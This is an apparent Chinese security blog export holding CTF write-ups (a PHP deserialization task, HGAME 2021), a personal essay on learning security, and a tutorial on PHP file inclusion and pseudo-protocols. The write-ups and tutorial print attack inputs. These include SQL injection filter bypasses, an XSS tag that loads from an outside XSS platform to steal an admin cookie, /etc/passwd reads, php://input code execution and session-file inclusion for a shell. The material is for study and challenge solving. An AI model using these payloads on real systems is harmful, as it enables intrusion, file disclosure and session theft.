<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>于是构造完整的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4f9b10f1-69d5-4b66-b1d1-2b15bab7e939.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag。</p>
]]></content>
      <categories>
        <category>WP</category>
      </categories>
  </entry>
  <entry>
    <title>初。</title>
    <url>/2020/11/06/chu/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;故事要从我的童年讲起。</br></br><a id="more"></a></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;童年的天真烂漫总让人喜欢畅想，小时候的我总梦想着能够成为飞行员，开飞机在云彩间穿梭，不然就去当个黑客，那得有多帅啊！白驹过隙，转眼即将成年，身体条件早已将我飞行员的梦了结，黑客什么的也不过是虚无缥缈的遐想罢了，毕竟我都没见过黑客。在对未来人生的规划中，我没再想过自己喜欢什么，只在计算什么专业分数高，什么岗位薪资好，什么能让我日后的生活更平坦更轻松。有趣的事，高考的小失利打乱了我原本的志愿，学校专业都不得已重新选择。在这样的情况下，阴差阳错般，我进入了成信的信安，遥远的梦想又被上天有些调皮地拉进了我的现实生活。</br></br><br>或许是初心迷失太久了，它也在突然的光亮中惊喜着，期待着，从而给了我向前的动力。我自己在心底暗暗较劲：决不能浪费这样的缘分。抱着这样的信念，我第一次踏进了大学校园，第一次真正了解信安。这里不仅有许多早有基础的大佬入学，两个技术小组更是被大家津津乐道。这些都让我对信安更加好奇。这种感觉，就好似是，蒙纱的维纳斯终于轻轻揭面，可你仍然看不透她，她的深邃让你有点害怕，但也更让你好奇。我是一个内向的人，可我更是一个争强的人，自己没基础，就赶快补起来，我要努力迎头赶上。c语言老师讲得慢，我就自己努力往后学，不知道学习的方向，就放下自己的腼腆去问学长们。syc和dog3的招新让很多零基础（以及腼腆）的同学望而却步，可我却偏要去试试。</br></br></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;终于，不善言语的我”艰难“通过了两个小组“有嘴就行”的一面。我当然知道漫漫长路才刚刚开始，一点放松都不能有，所以dog3刚发了任务，我来不及惊讶任务的繁重，赶快进入了学习状态。讲真的，我性格一直比较随性，很少会很坚决地去努力做一件事，即使高考也只是尽尽力，从没有做到过别人那样挑灯夜战、悬梁刺股。但这次不同，或许是平生第一次真切的感受到了命运阴差阳错的眷顾，我多少有些亢奋，不愿辜负这一次机会，所以这次才如此认真。</br></br></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;万事开头难，这句话是SQL注入教会我的。65关的靶场两周完成，这还没算别的任务，对于零基础的我来说，时间真的很紧张。可大家都在学，像我这种起跑线就落后了的小白，更是会心急如焚。可是，越心急越干不了大事，我赶着往前学的同时却又害怕着自己基础不牢学成空中楼阁，更害怕自己落下了平时的课（因为大一课还是挺多的），到时候考试一窍不通，技术学不来又挂了科。结果就是，好几天过去了，我却还停留在第八关。朝着未来，独自走上陌生的路，我好像就这样轻易地被困在了手铐里，束手无策。</br></br></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;入夜，终点遥遥无期，我似乎耗尽了刚开始的那阵热情，想寻光，抬头却不见月，只悬着一轮圆形生铁，让人心头不安。</br></br></br></br></br></br></br></p>
<p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可这离第九百步还很远。</strong></br></br></br></br></br></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;充实的日子总是过得快，转眼间，秒针已经转到了十四天的末尾，我也算是勉勉强强坚持了下来，跌跌撞撞地完成了任务。小组的考察会很长，之后的相当一段时间，我都将陷入忙碌。平日里身为老退堂鼓艺术家的我竟没有一丝焦虑。这大概就是人们都在追求的人生意义吧，我之前不懂他们的执着，今日自己身在局中才终于理解：</br></br></p>
<p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道阻且长呢，没有光，就得学着自己打开手电筒。</br></br></br></br></br></br></br></br></strong></p>
<p>2020年11月6日记。</br></p>
]]></content>
      <categories>
        <category>study notes</category>
      </categories>
  </entry>
  <entry>
    <title>HGAME 2021 WP</title>
    <url>/2021/03/02/hgame2021wp/</url>
    <content><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><p>网页代码中提示要把得到的信息放在<code>HEAD tag</code>中，所以猜测应该是修改http头部。</p>
<p>先直接访问<code>HitchhikerGuide.php</code>，405错误，应该是请求方法不对，把GET改为POST，成功得到提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</span><br></pre></td></tr></table></figure>

<a id="more"></a>这里我想了好久是什么意思，百度查了半天这个东西是什么意思，后来开窍了，HGAME的思路就是要中二，所以它就是一个浏览器，直接代替Firefox就行。后面跟着步骤修改头部信息就好。以下是完整头部修改结果：

<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/1.png"></p>
<p>得到flag。</p>
<h3 id="watermelon"><a href="#watermelon" class="headerlink" title="watermelon"></a>watermelon</h3><p>没想到思路 ，在project.js里翻了半天，最终找到了base64编码的flag，应该不是预期解。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gameOverShowText: function (e, t) &#123;</span><br><span class="line">	if(e &gt; 1999)&#123;</span><br><span class="line">		alert(window.atob(&quot;aGdhbWV7ZG9feW91X2tub3dfY29jb3NfZ2FtZT99&quot;))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="智商检测鸡"><a href="#智商检测鸡" class="headerlink" title="智商检测鸡"></a>智商检测鸡</h3><p>在fuckmath.js中可以看到代码，直接尝试访问<code>/api/getFlag</code>来getFlag后得到一个假flag，还被出题师傅嘲讽了一番。。。</p>
<p>我猜这道题的解法应该是在console里修改solving的值为100，可是我看不怎么懂js，更不会用console，瞎试了半天也没试出来。</p>
<h3 id="宝藏走私者"><a href="#宝藏走私者" class="headerlink" title="宝藏走私者"></a>宝藏走私者</h3><p>开始一点都不会，网址还老崩，后来下线再上线后给了hint，原来是http走私啊。一波学习以后成功解出：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/2.png"></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>签到题，先base64再base32再base16解码得到flag。</p>
<h3 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h3><blockquote>
<p>学到的知识：</p>
<p>​        加密压缩包的一般处理方法：爆破、伪加密、明文攻击、CRC32碰撞</p>
<p>reference：<a href="https://www.cnblogs.com/leixiao-/p/9824557.html">https://www.cnblogs.com/leixiao-/p/9824557.html</a></p>
<p>reference：<a href="https://blog.csdn.net/qq_26187985/article/details/83654197">https://blog.csdn.net/qq_26187985/article/details/83654197</a></p>
</blockquote>
<p>得到一张图片，保存下来后用二进制编辑器打开，结尾有<code>.zip</code>格式的文件和一句提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Password is picture ID (Up to 8 digits)</span><br></pre></td></tr></table></figure>

<p>百度查图片id得到的消息都是p站图片id，结合猜测这是p站的图，找到原图即可。百度识图得到原图id得到密码，原文件修改成<code>.zip</code>后解压得到新的<code>.zip</code>和提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sometimes we don&#39;t need to care about password.</span><br><span class="line">Because it&#39;s too strong or null. XD</span><br><span class="line">By the way, I only use storage.</span><br></pre></td></tr></table></figure>

<p>刚开始我根据提示猜测是伪加密，后来发现行不通。</p>
<p>之后查各种压缩包的处理方法，知道了明文攻击，才明白了提示的意思。</p>
<p>将我们已知的txt文件压缩，只是用storage算法压缩，然后用ARCHPR进行明文攻击。</p>
<p>在这里卡了很久，主要是由于很多压缩软件的压缩方法都不对，ARCHPR一直报错，卡了很久，最后用winRAR成功了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/3.png"></p>
<p>打开之后还有一个加密压缩包，用二进制打开，看到很有规律的重复，猜测是某种编码。开始觉得是16进制，后来发现不大对，试了一堆之后发现是unicode，还需要自己补零。下面这里打错了，重复了一次 <code>_i5</code> 。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/4.png"></p>
<h3 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h3><blockquote>
<p>学到的知识：</p>
<p>​        <code>.pcapng</code>格式文件的作用与处理方法；图片的一般隐写思路。</p>
<p>reference：<a href="https://www.cnblogs.com/mq0036/p/11187138.html">https://www.cnblogs.com/mq0036/p/11187138.html</a></p>
<p>reference：<a href="https://blog.csdn.net/attitudeisaltitude/article/details/81698719">https://blog.csdn.net/attitudeisaltitude/article/details/81698719</a></p>
</blockquote>
<p>下载文件，发现是一个<code>.pcapng</code>格式的文件。使用wireshark工具打开，发现大量192.168.43.146与192.168.43.199的握手，在其中抓到了<code>galaxy.png</code>，将其导出后，发现图片既不是压缩包，也没有藏图像，猜测是修改高度来隐写的。将高由3296修改成3496，flag出现。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/5.png"></p>
<h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>文件是两个docx文档，一个上锁了，另一个打开之后没什么信息，后缀改为<code>.zip</code>后找到一个<code>password.xml</code>的文件，看格式可以知道是brianfuck密码，解密后得到密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DOYOUKNOWHIDDEN?</span><br></pre></td></tr></table></figure>

<p>打开第二个docx文档，由于密码的提示，我们在word选项里显示隐藏的文字，出现了几排空格。改成<code>.zip</code>里面有一堆我也不知道有啥用的文件。用十六进制编辑器打开看，发现结尾有brianfuck密码，应该就是对应那段空格。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/6.png"></p>
<p>但是解密我解不出来，显示错误，而且如果是这样，第一处解出来的密码有什么用呢？卡在这里了。</p>
<p>新思路：之前这个应该就是文档的密码而已，之前所谓的几排空格将其复制后粘贴到sublime里，看到了近似摩斯密码的文本，可是又不完全符合摩斯密码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/7.png"></p>
<p>啊我裂开，看了官方wp后才知道是snow隐写，题目图片给的提示被我忽略了，主要还是见得少，多长长见识吧。</p>
<hr>
<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="200ok"><a href="#200ok" class="headerlink" title="200ok!"></a>200ok!</h3><p>该题考查sql注入。</p>
<p>注入点是在header的status字段，这一点我没有验证出来；屏蔽了一些词和空格，我们用大小写绕过，空格用<code>/**/</code>来代替。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Status: -1&#39; uniOn&#x2F;**&#x2F;seLect&#x2F;**&#x2F;ffffff14gggggg&#x2F;**&#x2F;fRom&#x2F;**&#x2F;f1111111144444444444g;#</span><br></pre></td></tr></table></figure>

<p>得到flag。</p>
<h3 id="Post-to-zuckonit"><a href="#Post-to-zuckonit" class="headerlink" title="Post to zuckonit"></a>Post to zuckonit</h3><p>这道题基本可以看出是XSS的考查，POST恶意代码，将其提交后得到管理员的cookie再用token访问<code>/flag</code>即可。</p>
<p>经过尝试，<code>script</code>会被转换成<code>div</code>，可以用img标签，部分关键词双写绕过，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Img sRC&#x3D;hthttptps:&#x2F;&#x2F;xss.pt&#x2F;vhFCp.jpg&gt;</span><br></pre></td></tr></table></figure>

<p>可是我的xss平台总是拿不到cookie，换了很多个平台也没用，如下图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/wp/hgame2021wp/8.png"></p>
<p>到现在也不知道为什么。。。</p>
]]></content>
      <categories>
        <category>WP</category>
      </categories>
  </entry>
  <entry>
    <title>文件包含漏洞&amp;伪协议总结</title>
    <url>/2021/01/02/php3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要总结文件包含漏洞和伪协议相关知识。文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发邮箱联系我删除。多有不合理之处，望大佬指点。</p>
<hr>
<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h2><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当做PHP来执行，这会为开发者节省大量的时间。这意味着可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，只更新一个包含文件就可以了，或者当向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。<a id="more"></a></p>
<p>PHP中的文件包含函数有以下四种：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require()：	找不到被包含的文件时会产生致命错误，并停止脚本运行。</span><br><span class="line"></span><br><span class="line">include()：	找不到被包含的文件时只会产生警告，脚本将继续运行。</span><br><span class="line"></span><br><span class="line">include_once()：	与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，确保它只被包括一次以避免函数重定义、变量重新赋值等问题。</span><br><span class="line"></span><br><span class="line">require_once()：	与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br></pre></td></tr></table></figure>



<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
<p>文件包含可以包含任意文件，即便被包含的文件并不是与当前编程语言相关，甚至为图片，只要文件被包含，其内容会被包含文件包含，并以当前服务器脚本语言执行。</p>
<p>各类文件包含的利用方法都是一样的，只是包含文件的位置不同，从而做出了区分。</p>
<p>主要分为<strong>本地文件包含漏洞</strong>和<strong>远程文件包含漏洞</strong>。</p>
<h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>当包含的文件在服务器本地时，就形成了本地文件包含。</p>
<p>下面我们来简单做个测试：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//以上代码中可以控制可控参数file来控制包含的$file的值。</span></span><br></pre></td></tr></table></figure>

<p>因为文件包含可以包含任意文件，所以我们可以建立任意后缀文件进行包含，比如新建一个文件<code>file.txt</code>,文件内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们包含<code>file.txt</code>文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpinclude/1.png"></p>
<p>如果包含的文件内容不符合php语言语法的，会直接将文件内容输出。</p>
<p>像上面这样的漏洞叫做无限制本地文件包含漏洞。如果开发者做了一定的限制，如限制了包含文件的后缀，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $file;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br></pre></td></tr></table></figure>

<p>这样的话，我们的<code>file.txt</code>就会被识别为<code>file.txt.php</code>，从而无法找到要包含的文件。</p>
<p>像这样的有限制本地文件包含漏洞，我们可以通过<code>%00</code>截断、路径长度截断等方法来绕过。</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><code>%00</code>截断</h3><p>方法：在文件名结尾加<code>%00</code> 。</p>
<p>条件：PHP版本小于<code>5.3</code>、<code>php.ini</code>文件中<code>magic_quotes_gpc = off</code>、对可控参数并未使用<code>addslashes</code>函数。</p>
<h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>方法：文件结尾加/./././././././来超出长度。</p>
<p>条件：在 windows OS 中点号需要长于256；linux OS 中要长于4096。</p>
<blockquote>
<p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
</blockquote>
<h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>方法：文件结尾加点号。</p>
<p>条件：在 windows OS 中点号需要长于256。</p>
<h2 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h2><blockquote>
<p>引自Freebuf：<a href="https://www.freebuf.com/news/182280.html">《Web安全实战系列：文件包含漏洞》</a></p>
</blockquote>
<p>由于我们可以通过<code>phpinfo</code>的信息来获取到session的存储位置，当其中的内容可控时，我们就可以将恶意代码存储到该目录下，从而getshell。</p>
<p>通过phpinfo的信息，获取到session.save_path为/var/lib/php/session：</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpinclude/2.png"></p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$ctfs=$_GET[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&quot;username&quot;</span>]=$ctfs;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上述php会将获取到的GET型ctfs变量的值存入到session中。</p>
<p>当访问<a href="http://www.ctfs-wiki/session.php?ctfs=ctfs">http://www.ctfs-wiki/session.php?ctfs=ctfs</a> 后，会在/var/lib/php/session目录下存储session的值。</p>
<p>session的文件名为sess_+session id，session id可以通过开发者模式获取。</p>
<p>获取后拼接session的文件名为<code>sess_akp79gfiedh13ho11i6f3sm6s6</code>。</p>
<p>到服务器的/var/lib/php/session目录下查看果然存在此文件，内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username|s:4:&quot;ctfs&quot;;</span><br><span class="line">[root@c21336db44d2 session]# cat sess_akp79gfiedh13ho11i6f3sm6s6</span><br><span class="line">username|s:4:&quot;ctfs&quot;</span><br></pre></td></tr></table></figure>



<p>通过上面的分析，我们可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。</p>
<p>当访问<a href="http://www.ctfs-wiki/session.php?ctfs=">http://www.ctfs-wiki/session.php?ctfs=</a>&lt;?php phpinfo() ;? &gt;后，会在/var/lib/php/session目录下存储session的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@6da845537b27 session]# cat sess_83317220159fc31cd7023422f64bea1a</span><br><span class="line">username|s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。</p>
<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>当包含的文件在远程服务器上时，就形成了远程文件包含。</p>
<p>远程包含需要<code>php.ini</code>中<code>allow_url_include = on</code>以及<code>allow_url_fopen=on</code>，且所包含远程服务器的文件后缀不能与目标服务器语言相同。(比如目标服务器是php脚本语言解析的，那么包含的远程服务器文件后缀不能是<code>php</code>)，否则我们将得到远程服务器的信息，而非目标服务器。</p>
<p>所以我们在利用远程包含文件漏洞时，不能用<code>.php</code>后缀的文件，就要把<code>.php</code>改为<code>.txt</code>一类的后缀来包含。</p>
<p>当开发者对远程文件包含进行了后缀名限制时，我们也有很多绕过方法。</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $file;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br></pre></td></tr></table></figure>



<h3 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h3><p>方法：结尾加问号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt?</span><br></pre></td></tr></table></figure>



<h3 id="井号绕过"><a href="#井号绕过" class="headerlink" title="井号绕过"></a>井号绕过</h3><p>方法：结尾加<code>#</code>（url中为<code>%23</code>）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt%23</span><br></pre></td></tr></table></figure>



<p>空格绕过</p>
<p>方法：结尾加空格（url中为<code>%3f</code>）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt%3f</span><br></pre></td></tr></table></figure>



<hr>
<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>PHP伪协议事实上就是支持的协议与封装协议，共十二种。</p>
<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpinclude/3.png"></p>
<p>伪协议常常用于文件包含漏洞之中。</p>
<p>以下总结部分常用的伪协议。</p>
<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><p>用于访问本地文件系统的文件。</p>
<p>条件：<code>allow_url_fopen: off/on</code> 、<code>allow_url_include: off/on</code></p>
<p>用法及示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux：http:&#x2F;&#x2F;127.0.0.1&#x2F;FI&#x2F;LFI.php?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd		绝对路径</span><br><span class="line">Windows	：http:&#x2F;&#x2F;192.168.6.128:8001&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;C:\DVWA-master\vulnerabilities\fi\1.txt  绝对路径</span><br></pre></td></tr></table></figure>



<h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><table>
<thead>
<tr>
<th>协议</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>php://input</td>
<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
</tr>
<tr>
<td>php://output</td>
<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
</tr>
<tr>
<td>php://fd</td>
<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
</tr>
<tr>
<td>php://memory php://temp</td>
<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
</tr>
<tr>
<td>php://filter</td>
<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
</tr>
</tbody></table>
<p>其中最常用的是<code>php://filter </code>和 <code>php://input</code>。</p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>将POST输入流当做PHP代码执行。</p>
<p>条件：<code>allow_url_include：on</code> 、<code>allow_url_fopen：on/off</code></p>
<p>用法：将要执行的php代码直接在post中提交。</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.6.128:8001&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">	POST数据：&lt;?php echo &#39;test&#39;; ?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>可以作为一个中间流来处理其他流，可进行任意文件的读取，一般用于读取php的源代码。</p>
<p>条件：<code>allow_url_fopen: off/on</code>  、<code>allow_url_include: off/on</code></p>
<p>用法：</p>
<table>
<thead>
<tr>
<th align="left">名称</th>
<th align="left">描述</th>
<th align="left">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="left">resource=&lt;要过滤的数据流&gt;</td>
<td align="left">指定了你要筛选过滤的数据流。</td>
<td align="left">必选</td>
</tr>
<tr>
<td align="left">read=&lt;读链的筛选列表&gt;</td>
<td align="left">可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
<td align="left">可选</td>
</tr>
<tr>
<td align="left">write=&lt;写链的筛选列表&gt;</td>
<td align="left">可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
<td align="left">可选</td>
</tr>
<tr>
<td align="left">&lt;；两个链的筛选列表&gt;</td>
<td align="left">任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
<td align="left"></td>
</tr>
</tbody></table>
<p>参数见下：</p>
<table>
<thead>
<tr>
<th align="left">字符串过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">string.rot13</td>
<td>等同于<code>str_rot13()</code>，rot13变换</td>
</tr>
<tr>
<td align="left">string.toupper</td>
<td>等同于<code>strtoupper()</code>，转大写字母</td>
</tr>
<tr>
<td align="left">string.tolower</td>
<td>等同于<code>strtolower()</code>，转小写字母</td>
</tr>
<tr>
<td align="left">string.strip_tags</td>
<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>转换过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>convert.base64-encode &amp; convert.base64-decode</td>
<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
</tr>
<tr>
<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>压缩过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>zlib.deflate &amp; zlib.inflate</td>
<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
</tr>
<tr>
<td>bzip2.compress &amp; bzip2.decompress</td>
<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>加密过滤器</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>mcrypt.*</td>
<td>libmcrypt 对称加密算法</td>
</tr>
<tr>
<td>mdecrypt.*</td>
<td>libmcrypt 对称解密算法</td>
</tr>
</tbody></table>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?page=php://filter/read=string.toupper/resource=http://www.example.com</span><br><span class="line">	read=读取形式 这里的string.toupper 是将读出来的字符串大写形式呈现 resource 接对象</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br><span class="line">	php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</span><br><span class="line"></span><br></pre></td></tr></table></figure>



